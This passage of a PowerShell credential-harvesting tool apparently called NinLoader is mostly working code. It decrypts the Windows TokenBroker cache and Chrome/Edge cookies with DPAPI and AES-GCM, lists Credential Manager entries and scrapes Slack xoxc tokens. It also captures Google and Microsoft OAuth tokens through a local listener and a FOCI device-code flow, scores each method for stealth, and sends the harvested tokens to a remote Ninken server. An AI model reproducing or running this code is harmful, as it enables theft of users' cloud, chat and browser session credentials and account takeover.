                    elseif ($params["error"]) { $authCode = "ERROR:$($params['error'])" }
                }
            }

            # Always try the manual fallback if $authCode is still null
            if (-not $authCode -and $request.Url.Query) {
                $qs = $request.Url.Query.TrimStart("?")
                foreach ($pair in $qs.Split("&")) {
                    $kv = $pair.Split("=", 2)
                    if ($kv[0] -eq "code" -and $kv.Count -gt 1) {
                        $authCode = [System.Uri]::UnescapeDataString($kv[1])
                    }
                }
            }

            # Send response
            $response = $context.Response
            $responseBody = [System.Text.Encoding]::UTF8.GetBytes("<h2>NinLoader: GWS token captured! Close this tab.</h2>")
            $response.StatusCode = 200
            $response.ContentType = "text/html"
            $response.ContentLength64 = $responseBody.Length
            $response.OutputStream.Write($responseBody, 0, $responseBody.Length)
            $response.Close()
            break
        }
        Start-Sleep -Milliseconds 500
    }

    $httpListener.Stop()
    $httpListener.Close()

    if (-not $authCode) {
        Write-Host "Timeout -- no OAuth redirect received (3 min)" -ForegroundColor Red
        return @()
    }

    if ($authCode.StartsWith("ERROR:")) {
        Write-Host "OAuth error: $authCode" -ForegroundColor Red
        return @()
    }

    # 6. Exchange auth code for tokens
    Write-Host "Auth code captured! Exchanging for tokens..." -ForegroundColor Green
    $tokenEndpoint = "https://oauth2.googleapis.com/token"

    try {
        $tokenBody = @{
            code          = $authCode
            client_id     = $clientId
            client_secret = $clientSecret
            redirect_uri  = $redirectUri
            grant_type    = "authorization_code"
        }
        $tokenResult = Invoke-RestMethod -Method Post -Uri $tokenEndpoint `
            -Body $tokenBody -ContentType "application/x-www-form-urlencoded" -TimeoutSec 30
    }
    catch {
        Write-Host "Token exchange failed: $_" -ForegroundColor Red
        return @()
    }

    # 7. Extract email from ID token
    $email = $null
    if ($tokenResult.id_token) {
        $claims = Decode-JwtPayload -Token $tokenResult.id_token
        $email = $claims.email
    }

    $scopeStr = $tokenResult.scope
    $resultScopes = if ($scopeStr) { $scopeStr -split " " } else { $script:GwsScopes }

    $result = New-TokenResult -Service "google" -Source "gws_cli" `
        -StealthScore 3 -AccountId $email -Username $email `
        -AccessToken $tokenResult.access_token `
        -RefreshToken $tokenResult.refresh_token `
        -ClientId $clientId -ClientSecret $clientSecret `
        -TokenUri $tokenEndpoint -Scopes $resultScopes `
        -Extra @{ grant_type = "authorization_code"; gws_cli = $true }

    Write-Host "SUCCESS -- GWS token for $(if ($email) { $email } else { 'unknown' })" -ForegroundColor Green
    return @($result)
}

# ============================================================================
# Microsoft Collectors
# ============================================================================
function Get-MicrosoftTokens {
    param([switch]$DiscoverOnly)

    $results = @()

    # DPAPI Token Broker Cache (Windows only)
    if (Get-IsWindows) {
        $tokenBroker = Join-Path $env:LOCALAPPDATA "Microsoft\TokenBroker\Cache"
        if (Test-Path $tokenBroker) {
            if ($DiscoverOnly) {
                $results += New-DiscoveryResult -Service "microsoft" -Source "dpapi" `
                    -Path $tokenBroker -StealthScore 4 `
                    -Details "DPAPI-protected token cache"
            }
            else {
                # DPAPI decryption via .NET
                try {
                    Add-Type -AssemblyName System.Security
                    foreach ($f in Get-ChildItem $tokenBroker -Filter "*.tbres") {
                        try {
                            $bytes = [System.IO.File]::ReadAllBytes($f.FullName)
                            $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
                                $bytes, $null,
                                [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                            )
                            $text = [System.Text.Encoding]::UTF8.GetString($decrypted)
                            # Try to parse as JSON
                            try {
                                $data = $text | ConvertFrom-Json
                                if ($data.access_token -or $data.AccessToken) {
                                    $at = if ($data.access_token) { $data.access_token } else { $data.AccessToken }
                                    $results += New-TokenResult -Service "microsoft" -Source "dpapi" `
                                        -StealthScore 4 -AccessToken $at `
                                        -Extra @{ source_file = $f.FullName }
                                }
                            }
                            catch { }
                        }
                        catch { }
                    }
                }
                catch { }
            }
        }

        # Credential Manager
        try {
            $cmdkeyOutput = & cmdkey /list 2>&1
            foreach ($line in $cmdkeyOutput) {
                $lineStr = "$line"
                if ($lineStr -match 'Target:\s*(.+)$') {
                    $target = $Matches[1].Trim()
                    if ($target -like "*microsoft*" -or $target -like "*live.com*" -or $target -like "*office*") {
                        if ($DiscoverOnly) {
                            $results += New-DiscoveryResult -Service "microsoft" -Source "credential_manager" `
                                -AccountHint $target -StealthScore 4 `
                                -Details "Windows Credential Manager"
                        }
                    }
                }
            }
        }
        catch { }
    }

    return $results
}

# ============================================================================
# Microsoft FOCI Device Code Flow (matching Python foci_device_code.py)
# ============================================================================
function Invoke-MicrosoftDeviceCode {
    param(
        [string]$TenantId = "common",
        [string]$ClientName = "office"
    )

    $clientId = $script:FociClients[$ClientName]
    if (-not $clientId) { $clientId = $ClientName }

    $authority = "https://login.microsoftonline.com/$TenantId"
    $scope = $script:FociDefaultScopes

    Write-Host ""
    Write-Host ("=" * 60) -ForegroundColor White
    Write-Host "  MICROSOFT FOCI DEVICE CODE FLOW" -ForegroundColor White
    Write-Host ("=" * 60) -ForegroundColor White
    Write-Host "  Client: $ClientName ($clientId)" -ForegroundColor Gray
    Write-Host "  Tenant: $TenantId" -ForegroundColor Gray
    Write-Host "  Scopes: $scope" -ForegroundColor Gray
    Write-Host ("=" * 60) -ForegroundColor White
    Write-Host ""

    # Step 1: Get device code
    try {
        $body = @{
            client_id = $clientId
            scope     = $scope
        }
        $response = Invoke-RestMethod -Method Post `
            -Uri "$authority/oauth2/v2.0/devicecode" `
            -Body $body -ContentType "application/x-www-form-urlencoded"
    }
    catch {
        Write-Host "Failed to initiate device code flow: $_" -ForegroundColor Red
        return @()
    }

    $deviceCode = $response.device_code
    $userCode = $response.user_code
    $verificationUri = $response.verification_uri

    if (-not $deviceCode -or -not $userCode) {
        Write-Host "Invalid device code response." -ForegroundColor Red
        return @()
    }

    Write-Host "  Visit:  $verificationUri" -ForegroundColor Green
    Write-Host "  Code:   $userCode" -ForegroundColor Green
    Write-Host ""

    # Step 2: Poll for token
    $interval = $response.interval
    if (-not $interval) { $interval = 5 }
    $expiresIn = $response.expires_in
    if (-not $expiresIn) { $expiresIn = 900 }
    $deadline = (Get-Date).AddSeconds($expiresIn)

    Write-Host "Waiting for user to approve (timeout=${expiresIn}s) ..." -ForegroundColor Gray

    while ((Get-Date) -lt $deadline) {
        Start-Sleep -Seconds $interval

        try {
            $tokenBody = @{
                grant_type  = "urn:ietf:params:oauth:grant-type:device_code"
                client_id   = $clientId
                device_code = $deviceCode
            }
            $tokenResult = Invoke-RestMethod -Method Post `
                -Uri "$authority/oauth2/v2.0/token" `
                -Body $tokenBody -ContentType "application/x-www-form-urlencoded"

            if ($tokenResult.access_token) {
                Write-Host "Device code approved -- token acquired." -ForegroundColor Green

                # Decode JWT claims from id_token
                $claims = @{}
                if ($tokenResult.id_token) {
                    $claims = Decode-JwtPayload -Token $tokenResult.id_token
                }

                $tenantIdResolved = if ($claims.tid) { $claims.tid } else { $TenantId }
                $scopeStr = $tokenResult.scope
                $tokenScopes = if ($scopeStr) { $scopeStr -split " " } else { $scope -split " " }

                return @(New-TokenResult -Service "microsoft" -Source "foci_device_code" `
                    -StealthScore 3 `
                    -AccountId $claims.oid `
                    -Username $claims.preferred_username `
                    -DisplayName $claims.name `
                    -TenantId $tenantIdResolved `
                    -AccessToken $tokenResult.access_token `
                    -RefreshToken $tokenResult.refresh_token `
                    -ClientId $clientId `
                    -TokenUri "$authority/oauth2/v2.0/token" `
                    -Scopes $tokenScopes `
                    -Foci $true `
                    -Extra @{
                        client_name    = $ClientName
                        token_type     = $tokenResult.token_type
                        foci_clients   = $script:FociClients
                        id_token_claims = @{
                            oid                = $claims.oid
                            tid                = $claims.tid
                            preferred_username = $claims.preferred_username
                            name               = $claims.name
                        }
                    })
            }
        }
        catch {
            $err = $null
            try { $err = $_.ErrorDetails.Message | ConvertFrom-Json } catch { }
            if ($err) {
                if ($err.error -eq "authorization_pending") {
                    Write-Host "." -NoNewline -ForegroundColor Gray
                    continue
                }
                elseif ($err.error -eq "slow_down") {
                    $interval += 5
                    continue
                }
                elseif ($err.error -eq "authorization_declined") {
                    Write-Host "`nUser declined the device code authorization." -ForegroundColor Red
                    return @()
                }
                elseif ($err.error -eq "expired_token") {
                    Write-Host "`nDevice code expired before user approved." -ForegroundColor Red
                    return @()
                }
                else {
                    Write-Host "`nAuthentication failed: $($err.error_description)" -ForegroundColor Red
                    return @()
                }
            }
            else {
                Write-Host "`nNetwork error during polling: $_" -ForegroundColor Red
                return @()
            }
        }
    }

    Write-Host "`nTimed out waiting for device code approval." -ForegroundColor Red
    return @()
}

# ============================================================================
# Slack Collectors
# ============================================================================
function Get-SlackTokens {
    param([switch]$DiscoverOnly)

    $results = @()
    $homePath = Get-HomePath

    $slackDir = if ($env:APPDATA) { Join-Path $env:APPDATA "Slack" } else { Join-Path $homePath ".config\Slack" }
    $lsDir = Join-Path $slackDir "Local Storage\leveldb"

    if (Test-Path $lsDir) {
        foreach ($logFile in Get-ChildItem $lsDir -Filter "*.log") {
            try {
                $content = [System.IO.File]::ReadAllText($logFile.FullName)
                if ($content -match 'xoxc-') {
                    if ($DiscoverOnly) {
                        $results += New-DiscoveryResult -Service "slack" -Source "desktop" `
                            -Path $lsDir -StealthScore 5 -Details "xoxc token found"
                        break
                    }
                    else {
                        $tokenMatches = [regex]::Matches($content, '(xoxc-[A-Za-z0-9-]+)')
                        $seen = @{}
                        foreach ($m in $tokenMatches) {
                            $token = $m.Value
                            if ($token.Length -gt 20 -and -not $seen[$token]) {
                                $seen[$token] = $true
                                $results += New-TokenResult -Service "slack" -Source "desktop" `
                                    -StealthScore 5 -AccessToken $token `
                                    -Extra @{ token_type = "xoxc"; source_file = $logFile.FullName }
                            }
                        }
                    }
                }
            }
            catch { }
        }
    }

    return $results
}

# ============================================================================
# Chrome DPAPI Cookie Decrypt (Windows only)
# ============================================================================
function Get-ChromeCookies {
    <#
    .SYNOPSIS
        Extract and decrypt Chrome cookies on Windows using DPAPI + AES-GCM.
        Uses .NET ProtectedData for DPAPI and System.Security.Cryptography.AesGcm for AES-GCM.
        Zero external dependencies.

    .PARAMETER Profile
        Chrome profile name (Default, Profile 1, etc.)

    .PARAMETER HostPatterns
        List of host patterns to filter (e.g., @('.google.com', '.slack.com'))
    #>
    param(
        [string]$Profile = "Default",
        [string[]]$HostPatterns
    )

    if (-not (Get-IsWindows)) {
        Write-Host "Chrome DPAPI cookie decrypt is Windows-only." -ForegroundColor Yellow
        return @()
    }

    # Locate Chrome user data directory
    $chromeDir = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
    if (-not (Test-Path $chromeDir)) {
        # Try Edge as fallback
        $chromeDir = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data"
    }
    if (-not (Test-Path $chromeDir)) {
        Write-Host "Chrome/Edge user data directory not found." -ForegroundColor Yellow
        return @()
    }

    # 1. Read and decrypt the master key from Local State
    $localState = Join-Path $chromeDir "Local State"
    if (-not (Test-Path $localState)) {
        Write-Host "Local State file not found." -ForegroundColor Yellow
        return @()
    }

    try {
        Add-Type -AssemblyName System.Security -ErrorAction Stop

        $stateData = Get-Content $localState -Raw | ConvertFrom-Json
        $encKeyB64 = $stateData.os_crypt.encrypted_key
        if (-not $encKeyB64) {
            Write-Host "encrypted_key not found in Local State" -ForegroundColor Yellow
            return @()
        }

        $encKey = [System.Convert]::FromBase64String($encKeyB64)
        # Strip "DPAPI" prefix (5 bytes)
        if ([System.Text.Encoding]::ASCII.GetString($encKey, 0, 5) -eq "DPAPI") {
            $encKey = $encKey[5..($encKey.Length - 1)]
        }

        # Decrypt v10 key with DPAPI (silent on Windows, no prompt)
        $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $encKey, $null,
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        Write-Host "[INFO] v10 master key decrypted ($(  $masterKey.Length) bytes)." -ForegroundColor Gray

        # Try to decrypt app_bound_encrypted_key for v20 cookies
        $script:AppBoundKey = $null
        $abKeyB64 = $stateData.os_crypt.app_bound_encrypted_key
        if ($abKeyB64) {
            $abKeyRaw = [System.Convert]::FromBase64String($abKeyB64)
            # Strip "APPB" prefix (4 bytes)
            if ($abKeyRaw.Length -gt 4 -and [System.Text.Encoding]::ASCII.GetString($abKeyRaw, 0, 4) -eq "APPB") {
                $abData = $abKeyRaw[4..($abKeyRaw.Length - 1)]
                try {
                    $script:AppBoundKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
                        $abData, $null,
                        [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                    )
                    Write-Host "[INFO] App-bound key (v20) decrypted via user DPAPI." -ForegroundColor Green
                }
                catch {
                    Write-Host "[WARN] v20 app-bound key requires SYSTEM DPAPI (Chrome 127+ App-Bound Encryption)." -ForegroundColor Yellow
                    Write-Host "[WARN] v20 cookies cannot be decrypted without SYSTEM/admin privileges." -ForegroundColor Yellow
                }
            }
        }
    }
    catch {
        Write-Host "Failed to decrypt Chrome master key: $_" -ForegroundColor Red
        return @()
    }

    # 2. Copy Cookies database (avoid lock conflicts with running Chrome)
    $cookiesDb = Join-Path $chromeDir "$Profile\Network\Cookies"
    if (-not (Test-Path $cookiesDb)) {
        $cookiesDb = Join-Path $chromeDir "$Profile\Cookies"
    }
    if (-not (Test-Path $cookiesDb)) {
        Write-Host "Cookies database not found for profile '$Profile'." -ForegroundColor Yellow
        return @()
    }

    $tempDb = [System.IO.Path]::GetTempFileName()
    Copy-Item $cookiesDb $tempDb -Force
    # Also copy WAL/journal if present
    foreach ($suffix in "-wal", "-journal") {
        $walFile = "${cookiesDb}${suffix}"
        if (Test-Path $walFile) {
            Copy-Item $walFile "${tempDb}${suffix}" -Force
        }
    }

    # 3. Query cookies using ADO.NET SQLite (shipped with .NET on Windows)
    $cookies = @()
    try {
        # Use System.Data.SQLite if available, otherwise try Microsoft.Data.Sqlite
        # PowerShell 7+ on Windows may need manual assembly loading
        # Attempt to load the SQLite assembly
        $sqliteLoaded = $false

        # Try .NET built-in System.Data.SQLite
        try {
            Add-Type -AssemblyName "System.Data.SQLite" -ErrorAction Stop
            $sqliteLoaded = $true
            $connStr = "Data Source=$tempDb;Read Only=True;"
            $conn = New-Object System.Data.SQLite.SQLiteConnection($connStr)
        }
        catch { }

        # If .NET SQLite fails, use Python sqlite3 as fallback
        if (-not $sqliteLoaded) {
            Write-Host "[INFO] .NET SQLite not available, trying Python fallback..." -ForegroundColor Gray

            # Build WHERE clause for Python
            $whereClause = ""
            if ($HostPatterns -and $HostPatterns.Count -gt 0) {
                $pyClauses = @()
                foreach ($pat in $HostPatterns) {
                    $pyClauses += "host_key LIKE '%$($pat.Replace("'","''"))%'"
                }
                $whereClause = " WHERE " + ($pyClauses -join " OR ")
            }

            $pyTempFile = [System.IO.Path]::GetTempFileName() + ".py"
            $pyScript = @"
import sqlite3, json, base64, sys
db_path = sys.argv[1]
where_clause = sys.argv[2] if len(sys.argv) > 2 else ''
conn = sqlite3.connect(db_path)
cur = conn.cursor()
query = "SELECT host_key, name, encrypted_value, value, path, expires_utc, is_secure, is_httponly FROM cookies" + where_clause + " ORDER BY host_key, name"
cur.execute(query)
rows = []
for row in cur.fetchall():
    enc_val = row[2] if row[2] else b''
    rows.append({
        'host_key': row[0],
        'name': row[1],
        'encrypted_value_b64': base64.b64encode(enc_val).decode('ascii') if enc_val else '',
        'value': row[3] or '',
        'path': row[4] or '/',
        'expires_utc': row[5] or 0,
        'is_secure': row[6] or 0,
        'is_httponly': row[7] or 0
    })
conn.close()
print(json.dumps(rows))
"@
            Set-Content -Path $pyTempFile -Value $pyScript -Encoding UTF8
            $pyResult = $null
            try {
                $pyResult = python $pyTempFile $tempDb $whereClause 2>&1
            }
            catch {
                Write-Host "[WARN] Python SQLite fallback failed: $_" -ForegroundColor Yellow
                try { Remove-Item $pyTempFile -Force -ErrorAction SilentlyContinue } catch { }
                return @()
            }
            try { Remove-Item $pyTempFile -Force -ErrorAction SilentlyContinue } catch { }

            if (-not $pyResult -or "$pyResult" -match "Error|Traceback") {
                Write-Host "[WARN] Python SQLite error: $pyResult" -ForegroundColor Yellow
                return @()
            }

            $rows = $pyResult | ConvertFrom-Json
            Write-Host "[INFO] Python extracted $($rows.Count) cookie row(s) from Chrome DB." -ForegroundColor Gray

            foreach ($row in $rows) {
                $encValue = $null
                if ($row.encrypted_value_b64) {
                    $encValue = [System.Convert]::FromBase64String($row.encrypted_value_b64)
                }
                $plainValue = $row.value

                $value = $null
                if ($encValue -and $encValue.Length -gt 0) {
                    try {
                        $value = Decrypt-ChromeCookieValue -EncryptedValue $encValue -Key $masterKey
                    }
                    catch {
                        $value = $plainValue
                    }
                }
                else {
                    $value = $plainValue
                }

                if ($value) {
                    $cookies += [PSCustomObject]@{
                        Host     = $row.host_key
                        Name     = $row.name
                        Value    = $value
                        Path     = $row.path
                        Expires  = $row.expires_utc
                        Secure   = [bool]$row.is_secure
                        HttpOnly = [bool]$row.is_httponly
                    }
                }
            }
        }
        else {
            # .NET SQLite path
            $conn.Open()

            $query = "SELECT host_key, name, encrypted_value, value, path, expires_utc, is_secure, is_httponly FROM cookies"
            if ($HostPatterns -and $HostPatterns.Count -gt 0) {
                $clauses = @()
                foreach ($pat in $HostPatterns) {
                    $clauses += "host_key LIKE '%$pat%'"
                }
                $query += " WHERE " + ($clauses -join " OR ")
            }
            $query += " ORDER BY host_key, name"

            $cmd = $conn.CreateCommand()
            $cmd.CommandText = $query
            $reader = $cmd.ExecuteReader()

            while ($reader.Read()) {
                $hostKey = $reader["host_key"]
                $cookieName = $reader["name"]
                $encValue = $reader["encrypted_value"]
                $plainValue = $reader["value"]

                $value = $null
                if ($encValue -and $encValue.Length -gt 0) {
                    try {
                        $value = Decrypt-ChromeCookieValue -EncryptedValue $encValue -Key $masterKey
                    }
                    catch {
                        $value = $plainValue
                    }
                }
                else {
                    $value = $plainValue
                }

                if ($value) {
                    $cookies += [PSCustomObject]@{
                        Host     = $hostKey
                        Name     = $cookieName
                        Value    = $value
                        Path     = $reader["path"]
                        Expires  = $reader["expires_utc"]
                        Secure   = [bool]$reader["is_secure"]
                        HttpOnly = [bool]$reader["is_httponly"]
                    }
                }
            }

            $reader.Close()
            $conn.Close()
        }
    }
    catch {
        Write-Host "Cookie extraction error: $_" -ForegroundColor Red
    }
    finally {
        # Cleanup temp files
        foreach ($suffix in "", "-wal", "-journal") {
            try { Remove-Item "${tempDb}${suffix}" -Force -ErrorAction SilentlyContinue } catch { }
        }
    }

    return $cookies
}

function Initialize-AesGcmDecryptor {
    if ($script:AesGcmReady) { return }

    # Try .NET Core AesGcm first (PS7+)
    try {
        [System.Security.Cryptography.AesGcm] | Out-Null
        $script:AesGcmMode = "dotnet"
        $script:AesGcmReady = $true
        Write-Host "[INFO] Using .NET AesGcm for cookie decryption." -ForegroundColor Gray
        return
    }
    catch { }

    # Fallback: Windows CNG BCrypt P/Invoke (works on PS5.1/.NET Framework 4.x)
    try {
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public static class BcryptAesGcm {
    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    static extern uint BCryptOpenAlgorithmProvider(out IntPtr hAlgorithm, string pszAlgId, string pszImplementation, uint dwFlags);

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    static extern uint BCryptSetProperty(IntPtr hObject, string pszProperty, byte[] pbInput, int cbInput, uint dwFlags);

    [DllImport("bcrypt.dll")]
    static extern uint BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr hKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, uint dwFlags);

    [DllImport("bcrypt.dll")]
    static extern uint BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, IntPtr pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int cbResult, uint dwFlags);

    [DllImport("bcrypt.dll")]
    static extern uint BCryptDestroyKey(IntPtr hKey);

    [DllImport("bcrypt.dll")]
    static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint dwFlags);

    [StructLayout(LayoutKind.Sequential)]
    struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO {
        public int cbSize;
        public int dwInfoVersion;
        public IntPtr pbNonce;
        public int cbNonce;
        public IntPtr pbAuthData;
        public int cbAuthData;
        public IntPtr pbTag;
        public int cbTag;
        public IntPtr pbMacContext;
        public int cbMacContext;
        public int cbAAD;
        public long cbData;
        public int dwFlags;
    }

    public static byte[] Decrypt(byte[] key, byte[] nonce, byte[] ciphertext, byte[] tag) {
        IntPtr hAlg = IntPtr.Zero, hKey = IntPtr.Zero;
        IntPtr noncePtr = IntPtr.Zero, tagPtr = IntPtr.Zero, authInfoPtr = IntPtr.Zero;
        try {
            uint status = BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0);
            if (status != 0) throw new Exception("BCryptOpenAlgorithmProvider: 0x" + status.ToString("X8"));

            byte[] chainingMode = System.Text.Encoding.Unicode.GetBytes("ChainingModeGCM\0");
            status = BCryptSetProperty(hAlg, "ChainingMode", chainingMode, chainingMode.Length, 0);
            if (status != 0) throw new Exception("BCryptSetProperty: 0x" + status.ToString("X8"));

            status = BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, key.Length, 0);
            if (status != 0) throw new Exception("BCryptGenerateSymmetricKey: 0x" + status.ToString("X8"));

            var authInfo = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
            authInfo.cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
            authInfo.dwInfoVersion = 1;

            noncePtr = Marshal.AllocHGlobal(nonce.Length);
            Marshal.Copy(nonce, 0, noncePtr, nonce.Length);
            authInfo.pbNonce = noncePtr;
            authInfo.cbNonce = nonce.Length;

            tagPtr = Marshal.AllocHGlobal(tag.Length);
            Marshal.Copy(tag, 0, tagPtr, tag.Length);
            authInfo.pbTag = tagPtr;
            authInfo.cbTag = tag.Length;

            authInfoPtr = Marshal.AllocHGlobal(authInfo.cbSize);
            Marshal.StructureToPtr(authInfo, authInfoPtr, false);

            byte[] plaintext = new byte[ciphertext.Length];
            int cbResult;
            status = BCryptDecrypt(hKey, ciphertext, ciphertext.Length, authInfoPtr, null, 0, plaintext, plaintext.Length, out cbResult, 0);

            if (status != 0) throw new Exception("BCryptDecrypt: 0x" + status.ToString("X8"));

            if (cbResult < plaintext.Length) {
                byte[] trimmed = new byte[cbResult];
                Array.Copy(plaintext, trimmed, cbResult);
                return trimmed;
            }
            return plaintext;
        }
        finally {
            if (authInfoPtr != IntPtr.Zero) Marshal.FreeHGlobal(authInfoPtr);
            if (noncePtr != IntPtr.Zero) Marshal.FreeHGlobal(noncePtr);
            if (tagPtr != IntPtr.Zero) Marshal.FreeHGlobal(tagPtr);
            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
            if (hAlg != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlg, 0);
        }
    }
}
"@ -ErrorAction Stop
        $script:AesGcmMode = "bcrypt"
        $script:AesGcmReady = $true
        Write-Host "[INFO] Using BCrypt CNG for AES-GCM cookie decryption." -ForegroundColor Gray
    }
    catch {
        Write-Host "[WARN] AES-GCM decryption not available: $_" -ForegroundColor Yellow
        $script:AesGcmMode = "none"
        $script:AesGcmReady = $true
    }
}

function Decrypt-ChromeCookieValue {
    param(
        [byte[]]$EncryptedValue,
        [byte[]]$Key
    )

    if (-not $EncryptedValue -or $EncryptedValue.Length -lt 3) { return "" }

    $prefix = [System.Text.Encoding]::ASCII.GetString($EncryptedValue, 0, 3)

    if ($prefix -eq "v10" -or $prefix -eq "v11" -or $prefix -eq "v20") {
        # v20 uses app-bound encryption key (Chrome 127+)
        $decryptKey = $Key
        if ($prefix -eq "v20") {
            if ($script:AppBoundKey) {
                $decryptKey = $script:AppBoundKey
            }
            else {
                # v20 requires SYSTEM DPAPI -- cannot decrypt without elevation
                return ""
            }
        }

        $data = $EncryptedValue[3..($EncryptedValue.Length - 1)]
        if ($data.Length -lt 28) { return "" }

        $nonce = $data[0..11]
        $ciphertextWithTag = $data[12..($data.Length - 1)]
        $tagLength = 16
        $ciphertext = $ciphertextWithTag[0..($ciphertextWithTag.Length - $tagLength - 1)]
        $tag = $ciphertextWithTag[($ciphertextWithTag.Length - $tagLength)..($ciphertextWithTag.Length - 1)]

        Initialize-AesGcmDecryptor

        if ($script:AesGcmMode -eq "dotnet") {
            try {
                $aesGcm = [System.Security.Cryptography.AesGcm]::new($decryptKey)
                $plaintext = [byte[]]::new($ciphertext.Length)
                $aesGcm.Decrypt([byte[]]$nonce, [byte[]]$ciphertext, [byte[]]$tag, $plaintext)
                $aesGcm.Dispose()
                return [System.Text.Encoding]::UTF8.GetString($plaintext)
            }
            catch {
                if (-not $script:_decryptErrShown) {
                    Write-Host "[DEBUG] .NET AesGcm error: $_" -ForegroundColor Magenta
                    $script:_decryptErrShown = $true
                }
                return ""
            }
        }
        elseif ($script:AesGcmMode -eq "bcrypt") {
            try {
                $plaintext = [BcryptAesGcm]::Decrypt([byte[]]$decryptKey, [byte[]]$nonce, [byte[]]$ciphertext, [byte[]]$tag)
                return [System.Text.Encoding]::UTF8.GetString($plaintext)
            }
            catch {
                if (-not $script:_decryptErrShown) {
                    Write-Host "[DEBUG] BCrypt AES-GCM error: $_" -ForegroundColor Magenta
                    $script:_decryptErrShown = $true
                }
                return ""
            }
        }
        else {
            return ""
        }
    }
    else {
        # Old DPAPI-only format (no version prefix)
        try {
            $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
                $EncryptedValue, $null,
                [System.Security.Cryptography.DataProtectionScope]::CurrentUser
            )
            return [System.Text.Encoding]::UTF8.GetString($decrypted)
        }
        catch {
            try { return [System.Text.Encoding]::UTF8.GetString($EncryptedValue) }
            catch { return "" }
        }
    }
}

# ============================================================================
# Output Handlers
# ============================================================================
function Write-TokenOutput {
    param(
        [array]$Tokens,
        [string]$OutputType,
        [string]$OutputPath,
        [string]$NinkenUrl
    )

    if (-not $Tokens -or $Tokens.Count -eq 0) {
        Write-Host "No tokens collected." -ForegroundColor Yellow
        return
    }

    switch ($OutputType) {
        "stdout" {
            $Tokens | ConvertTo-Json -Depth 10
        }
        "file" {
            if (-not (Test-Path $OutputPath)) {
                New-Item -ItemType Directory -Path $OutputPath -Force | Out-Null
            }
            foreach ($token in $Tokens) {
                $svc = $token.collector.service
                $src = $token.collector.source
                $ts = Get-Date -Format "yyyyMMdd_HHmmss"
                $filename = "${svc}_${src}_${ts}.json"
                $filepath = Join-Path $OutputPath $filename

                $json = $token | ConvertTo-Json -Depth 10
                [System.IO.File]::WriteAllText($filepath, $json)
                Write-Host "Written: $filepath" -ForegroundColor Green
            }
        }
        "clipboard" {
            $json = $Tokens | ConvertTo-Json -Depth 10
            Set-Clipboard -Value $json
            Write-Host "Copied $($Tokens.Count) token(s) to clipboard." -ForegroundColor Green
        }
        "ninken" {
            if (-not $NinkenUrl) {
                Write-Host "Error: -NinkenUrl required for ninken output" -ForegroundColor Red
                return
            }
            $baseUrl = $NinkenUrl.TrimEnd("/")
            foreach ($token in $Tokens) {
                $url = "$baseUrl/api/auth/import"
                $payload = Convert-ToNinkenPayload -Token $token
                $json = $payload | ConvertTo-Json -Depth 10
                try {
                    $response = Invoke-RestMethod -Method Post -Uri $url `
                        -Body $json -ContentType "application/json" -TimeoutSec 30 `
                        -Headers @{ "Origin" = $baseUrl }

                    $svc = $token.collector.service
                    $src = $token.collector.source
                    Write-Host "Sent $svc/$src to $url" -ForegroundColor Green

                    # Print import URL if returned
                    if ($response.importUrl) {
                        Write-Host "  -> Open in browser: $($response.importUrl)" -ForegroundColor Cyan
                    }
                }
                catch {
                    Write-Host "Error sending to ${url}: $_" -ForegroundColor Red
                }
            }
        }
    }
}

function Convert-ToNinkenPayload {
    <#
    .SYNOPSIS
        Transform a token result to the Ninken /api/auth/import payload format.
        Maps to provider-specific shapes based on service.
    #>
    param([PSCustomObject]$Token)

    $t = $Token.token
    $svc = $Token.collector.service

    $payload = @{
        platform = $svc
        source   = "ninloader:$($Token.collector.source)"
    }

    switch ($svc) {
        "google" {
            $payload["access_token"] = $t.access_token
            $payload["refresh_token"] = $t.refresh_token
            $payload["client_id"] = $t.client_id
            $payload["client_secret"] = $t.client_secret
            $payload["token_uri"] = $t.token_uri
            $payload["scopes"] = $t.scopes
        }
        "microsoft" {
            $payload["access_token"] = $t.access_token
            $payload["refresh_token"] = $t.refresh_token
            $payload["client_id"] = $t.client_id
            $payload["tenant_id"] = $Token.account.tenant_id
            $payload["foci"] = $t.foci
        }
        "github" {
            $payload["token"] = $t.access_token
            $payload["username"] = $Token.account.username
        }
        "gitlab" {
            $payload["token"] = $t.access_token
            $payload["username"] = $Token.account.username
        }
        "aws" {
            $payload["access_key_id"] = $t.access_token
            $payload["secret_access_key"] = $t.client_secret
            $payload["session_token"] = $t.extra.session_token
            $payload["region"] = $t.extra.region
        }
        "slack" {
            $payload["token"] = $t.access_token
            $payload["cookie"] = $t.extra.d_cookie
        }
        default {
            foreach ($key in $t.Keys) {
                $payload[$key] = $t[$key]
            }
        }
    }

    return $payload
}

# ============================================================================
# Main Execution
# ============================================================================

# Show banner
Show-Banner

if ($Discover) {
    # -- Discovery mode --
    $allResults = @()

    $collectors = @{
        "aws"       = { Get-AwsCredentials -DiscoverOnly }
        "github"    = { Get-GitHubTokens -DiscoverOnly }
        "gitlab"    = { Get-GitLabTokens -DiscoverOnly }
        "google"    = { Get-GoogleTokens -DiscoverOnly }
        "microsoft" = { Get-MicrosoftTokens -DiscoverOnly }
        "slack"     = { Get-SlackTokens -DiscoverOnly }
    }

    # Interactive flows are always "discoverable"
